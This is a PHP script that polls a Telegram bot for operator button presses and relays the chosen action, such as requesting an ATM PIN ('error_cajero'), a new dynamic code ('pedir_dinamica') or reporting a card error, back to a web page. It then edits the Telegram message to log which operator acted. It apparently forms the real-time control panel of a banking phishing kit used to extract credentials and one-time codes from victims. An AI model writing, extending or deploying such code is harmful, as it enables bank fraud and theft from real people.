<?php
session_start();
header('Content-Type: application/json');

$config = require __DIR__ . '/../../config.php';

$transactionId = $_POST['transactionId'] ?? '';
$messageId     = $_POST['messageId'] ?? '';

if (!$transactionId || !$messageId) {
    echo json_encode(['action' => null]);
    exit;
}

$offset = $_SESSION['last_update_id'] ?? 0;

// LEER ACTUALIZACIONES
$ch = curl_init("https://api.telegram.org/bot{$config['bot_token']}/getUpdates?offset=" . ($offset + 1));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

$data   = json_decode($response, true);
$action = null;

if (!empty($data['result'])) {

    foreach ($data['result'] as $update) {

        // Guardar offset
        if (isset($update['update_id'])) {
            $_SESSION['last_update_id'] = $update['update_id'];
        }

        if (!isset($update['callback_query']['data'])) continue;

        $cb = $update['callback_query'];
        if (strpos($cb['data'], $transactionId) === false) continue;

        // Acción
        list($actionType) = explode(':', $cb['data']);

        $accionesValidas = [
            'error_logo',
            'error_cajero',
            'pedir_dinamica',
            'error_dinamica',
            'error_tarjeta',
            'confirm_finalizar'
        ];

        if (!in_array($actionType, $accionesValidas)) continue;

        $action = $actionType;

        // OPERADOR (corregido)
        $from = $cb['from'];
        $nombre = trim(($from['first_name'] ?? '') . ' ' . ($from['last_name'] ?? ''));
        $operador = !empty($from['username'])
            ? '@' . $from['username']
            : ($nombre !== '' ? $nombre : 'Operador');

        // TEXTO ORIGINAL
        $msg      = $cb['message'];
        $origText = $msg['text'] ?? '';
        if ($origText === '') break;

        $accionesHumanas = [
            'error_logo'        => 'Marcó ERROR DE LOGO',
            'error_cajero'      => 'Solicitó CLAVE DE CAJERO',
            'error_dinamica'    => 'Error en CÓDIGO DINÁMICO',
            'pedir_dinamica'    => 'Pidió NUEVA DINÁMICA',
            'error_tarjeta'     => 'Marcó ERROR DE TARJETA',
            'confirm_finalizar' => 'FINALIZÓ la operación'
        ];

        $accionHumana = $accionesHumanas[$actionType] ?? 'Acción realizada';

        $newText = $origText .
            "\n\n————————————\n" .
            "✅ Acción: <b>{$accionHumana}</b>\n" .
            "👤 Operador: <b>{$operador}</b>";

        // Reescribir mensaje
        $payload = [
            'chat_id'    => $msg['chat']['id'],
            'message_id' => $msg['message_id'],
            'text'       => $newText,
            'parse_mode' => 'HTML',
            'reply_markup' => json_encode(['inline_keyboard' => []])
        ];

        $chEdit = curl_init("https://api.telegram.org/bot{$config['bot_token']}/editMessageText");
        curl_setopt($chEdit, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($chEdit, CURLOPT_POST, true);
        curl_setopt($chEdit, CURLOPT_POSTFIELDS, json_encode($payload));
        curl_setopt($chEdit, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_exec($chEdit);
        curl_close($chEdit);

        break;
    }
}

echo json_encode(['action' => $action]);
